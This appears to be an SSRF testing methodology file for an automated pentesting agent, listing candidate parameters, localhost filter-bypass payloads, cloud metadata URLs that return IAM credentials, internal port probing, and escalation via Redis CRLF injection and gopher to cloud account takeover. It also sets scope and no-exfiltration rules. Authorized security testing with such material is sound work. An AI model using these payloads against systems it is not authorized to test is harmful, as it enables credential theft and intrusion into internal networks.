---
name: ssrf
description: "Server-Side Request Forgery: filter bypasses, cloud metadata, internal reachability, blind SSRF."
category: ssrf
allowed_tools:
  - curl
  - ffuf
  - gobuster
  - nikto
version: "1.0.0"
author: "MIRV"
---

# SSRF Methodology

## 1. Identify candidate parameters
- Any param taking a URL: `url=`, `image=`, `fetch=`, `file=`, `next=`, `redirect=`, `callback=`, `host=`, `proxy=`
- Webhooks, PDF / image renderers, OAuth `redirect_uri`, link previews, RSS importers

## 2. Confirm reachability
- Out-of-band: Burp Collaborator / interactsh — confirm DNS+HTTP hit
- In-band: `http://127.0.0.1:22` → response signature change; `http://localhost:6379` etc.

## 3. Filter bypass menu
- IP formats:
  - `http://127.0.0.1` / `http://localhost`
  - Decimal: `http://2130706433` (127.0.0.1)
  - Octal: `http://0177.0.0.1`
  - Hex: `http://0x7f.0.0.1`
  - IPv6: `http://[::1]`, `http://[::]`
  - `0.0.0.0`, `[::ffff:127.0.0.1]`
- DNS rebinding: register a domain that resolves to public then 127.0.0.1 (rbndr, lock.cmpxchg8b)
- Domain truncation: `internal.corp vocalname@127.0.0.1`
- URL parser confusion: `http://evil@127.0.0.1`, `http://127.0.0.1#@evil`
- Redirect: point an attacker host that 302 → internal URL

## 4. Cloud metadata endpoints
- AWS IMDSv1: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
  - IMDSv2 requires a token header — try if app preserves headers across hop
- GCP: `http://metadata.google.internal/computeMetadata/v1/` (requires `Metadata-Flavor: Google`)
- Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (requires `Metadata: true`)
- Alibaba / Tencent: `http://100.100.100.200/latest/meta-data/`

## 5. Internal port mapping
- Walk common ports on `127.0.0.1`: 22, 25, 6379, 11211, 169.254.169.254, 8080, 9090
- Time-based probing: closed ports connect-fast; open ports take longer

## 6. Blind SSRF
- No response body? Use OOB + error code differences
- Probe via file:// scheme if the server permits it (cURL, LFI-like)
- Compare timing for port open vs closed

## 7. Escalation
- SSRF → Redis CRLF: `http://127.0.0.1:6379/` then CRLF-inject `SET foo bar`
- SSRF → IMDS → IAM creds → cloud account takeover
- gopher:// scheme (when supported) for raw protocol shaping

## IMPORTANT
- All probing must stay within scope — internal IPs are in-scope only if explicitly authorized
- Never exfiltrate cloud credentials out of the engagement lab
- Capture each request + response + metadata file content as evidence